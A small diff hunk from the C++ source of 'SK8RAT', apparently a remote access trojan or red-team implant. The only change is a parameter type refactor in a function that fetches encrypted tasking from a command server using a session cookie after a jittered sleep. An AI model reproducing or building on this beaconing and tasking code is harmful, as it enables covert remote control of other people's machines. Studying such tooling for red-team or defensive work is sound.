@@ -494,7 +494,7 @@ void SK8RAT_EKE(unsigned char symmetrickey[32], std::string &sessioncookie)
 	SleepJitter(sleep, jitter);
 }
 
-void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
+void SK8RAT_tasking(unsigned char * symmetrickey, const std::string& sessioncookie)
 {
 	std::string encrypted_tasking = "";
 	agent_get_cookie(server_ip, server_port, get_uri, sessioncookie, encrypted_tasking);
